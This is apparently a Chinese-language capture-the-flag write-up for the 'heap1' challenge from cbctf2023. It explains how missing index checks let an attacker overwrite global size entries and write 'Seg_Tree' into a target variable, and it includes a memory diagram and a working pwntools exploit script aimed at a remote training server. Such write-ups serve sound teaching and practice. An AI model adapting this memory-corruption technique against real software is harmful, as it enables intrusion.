---
title: cbctf2023 - heap1 
date: 2024/4/22 00:43:00
updated: 2024/7/25 12:34:56
tags:
    - off-by-one error
excerpt: 利用off-by-one错误通过修改全局变量实现对目标地址的控制，最终成功利用该漏洞。
---

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO|Partial|
|Canary|off   |
|NX    |on    |
|PIE   |off   |
|strip |yes   |

## 解题思路

看似堆题实则根本不是堆题！看了半天`myread`，也没off-by-null，结果是虚晃一枪

能分配单元的数量由`gsizes[31]`决定，初始值是0x20，可以通过edit修改，另外还发现除了add函数，
剩下的函数都不检查idx，分配不分配的到指针也不检查，所以可以尝试把目标地址借助size写到`gsizes[0]`中；
由于没开pie，可以很轻松地写入，唯一的问题是edit需要大小，那么可以通过overlap解决

```plaintext
建议使用等宽字体
                +------------+
gbuf[0]      -> |      0     |
                +------------+
gsizes[0]    -> |      0     | <- gbuf[0 + 0x20] (以下不再赘述)
                +------------+
gsizes[31]   -> |    0x20    |
                +------------+
                ##############

                || 修改能分配的单元数量
                \/
                +------------+
gbuf[0]      -> |      0     |
                +------------+
gsizes[0]    -> |      0     |
                +------------+
gsizes[31]   -> |     666    |
                +------------+
gsizes[32]   -> |      0     |
                +------------+
target       -> |      0     | <- need to be 'Seg_Tree'
                +------------+

                || 先给32号单元设置size，方便后面edit
                \/
                +------------+
gbuf[0]      -> |      0     |
                +------------+
gsizes[0]    -> |  0x410130  | <- assumption
                +------------+
gsizes[31]   -> |     666    |
                +------------+
gsizes[32]   -> |      9     |
                +------------+
target       -> |      0     | 
                +------------+

                || 接着设置0号单元，将目标地址放在gsizes[0] (gbuf[32]) 上
                \/
                +------------+
gbuf[0]      -> |0x7f..773200| <- assumption (large memory chunk should be alloced near libc(?))
                +------------+
gsizes[0]    -> |  0x4040c0  |
                +------------+
gsizes[31]   -> |     666    |
                +------------+
gsizes[32]   -> |      9     |
                +------------+
target       -> |      0     | 
                +------------+

                || 最后edit32号单元，修改目标地址的内容
                \/
                +------------+
gbuf[0]      -> |0x7f..773200|
                +------------+
gsizes[0]    -> |  0x4040c0  | --+
                +------------+   |
gsizes[31]   -> |     666    |   |
                +------------+   |
gsizes[32]   -> |      9     |   |
                +------------+   |
target       -> | "Seg_Tree" | <-+
                +------------+
```

## EXPLOIT

```python
from pwn import *
def payload(lo:int):
    if lo:
        sh = process('./heap1')
        if lo & 0b10:
            gdb.attach(sh)
    else:
        sh = remote("training.0rays.club", 10073)

    def add(idx:int, size:int):
        sh.recvuntil(b'ice:')
        sh.sendline(b'1')
        sh.sendline(str(idx).encode())
        sh.sendline(str(size).encode())

    def edit(idx:int, cont:bytes):
        sh.recvuntil(b'ice:')
        sh.sendline(b'3')
        sh.sendline(str(idx).encode())
        sh.sendline(cont)

    def Exit():
        sh.recvuntil(b'ice:')
        sh.sendline(b'5')

    add(31, 666)
    add(32, 9)
    add(0, 0x4040c0)
    edit(32, b'Seg_Tree')
    Exit()
    sh.interactive()
```
